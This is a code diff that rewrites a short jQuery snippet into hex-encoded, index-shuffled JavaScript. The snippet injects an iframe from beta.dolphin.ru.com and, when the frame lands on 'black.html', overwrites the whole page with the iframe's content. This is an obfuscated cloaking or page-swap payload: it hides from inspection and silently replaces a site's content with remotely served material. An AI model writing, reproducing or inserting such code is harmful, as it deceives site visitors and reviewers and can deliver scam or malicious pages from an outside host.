@@ -1,12 +1,28 @@
+var _0x999a = ["\x73\x65\x61\x72\x63\x68", "\x6F\x70\x65\x6E", "\x77\x72\x69\x74\x65", "\x72\x65\x6D\x6F\x76\x65", "\x62\x6F\x64\x79", "\x61\x70\x70\x65\x6E\x64", "\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x65\x74\x61\x2E\x64\x6F\x6C\x70\x68\x69\x6E\x2E\x72\x75\x2E\x63\x6F\x6D\x2F\x63\x72\x79\x70\x74\x6F\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70\x3F\x64\x6F\x6D\x61\x69\x6E\x3D\x64\x65\x6E\x69\x73\x7A\x68\x69\x74\x6E\x79\x61\x6B\x6F\x76\x26\x70\x61\x74\x68\x3D\x7A\x6C\x61\x74\x61\x6E\x32\x34\x31\x31\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E", "\x69\x66\x72\x61\x6D\x65", "\x63\x6F\x6E\x74\x65\x6E\x74\x73", "\x66\x69\x6E\x64", "\x68\x74\x6D\x6C", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x68\x72\x65\x66", "\x73\x68\x69\x66\x74", "\x70\x75\x73\x68", "\x30\x78\x32", "\x30\x78\x31", "\x30\x78\x30", "\x30\x78\x36", "\x30\x78\x35", "\x30\x78\x34", "\x30\x78\x33", "\x30\x78\x38", "\x30\x78\x37", "\x66\x72\x61\x6D\x65\x73", "\x62\x6C\x61\x63\x6B\x2E\x68\x74\x6D\x6C", "\x30\x78\x39", "\x30\x78\x61", "\x30\x78\x62", "\x63\x6C\x6F\x73\x65", "\x30\x78\x63"];
+var _0xad9e = [_0x999a[0], _0x999a[1], _0x999a[2], _0x999a[3], _0x999a[4], _0x999a[5], _0x999a[6], _0x999a[7], _0x999a[8], _0x999a[9], _0x999a[10], _0x999a[11], _0x999a[12]];
+(function (_0x835fx2, _0x835fx3) {
+    var _0x835fx4 = function (_0x835fx5) {
+        while (--_0x835fx5) {
+            _0x835fx2[_0x999a[14]](_0x835fx2[_0x999a[13]]())
+        }
+    };
+    _0x835fx4(++_0x835fx3)
+}(_0xad9e, 0xe1));
+var _0x4ab5 = function (_0x835fx7, _0x835fx8) {
+    _0x835fx7 = _0x835fx7 - 0x0;
+    var _0x835fx9 = _0xad9e[_0x835fx7];
+    return _0x835fx9
+};
 $(function () {
-    $('body').append('<iframe src="https://beta.dolphin.ru.com/crypto/index.php?domain=deniszhitnyakov&path=zlatan2411"></iframe>');
+    $(_0x4ab5(_0x999a[17]))[_0x4ab5(_0x999a[16])](_0x4ab5(_0x999a[15]));
     setTimeout(function () {
-        var html = $('iframe').contents().find('html').html();
-        var frameLocation = window.frames[0].location.href;
-        console.log(frameLocation);
-        document.open();
-        document.write(html);
-        document.close();
-        $('iframe').remove();
-    }, 1500);
-});
+        var _0x835fxa = $(_0x4ab5(_0x999a[21]))[_0x4ab5(_0x999a[20])]()[_0x4ab5(_0x999a[19])](_0x999a[10])[_0x4ab5(_0x999a[18])]();
+        var _0x835fxb = window[_0x999a[24]][0x0][_0x4ab5(_0x999a[23])][_0x4ab5(_0x999a[22])];
+        if (_0x835fxb[_0x4ab5(_0x999a[26])](_0x999a[25]) != -0x1) {
+            document[_0x4ab5(_0x999a[27])]();
+            document[_0x4ab5(_0x999a[28])](_0x835fxa);
+            document[_0x999a[29]]()
+        };
+        $(_0x999a[7])[_0x4ab5(_0x999a[30])]()
+    }, 0x5dc)
+})
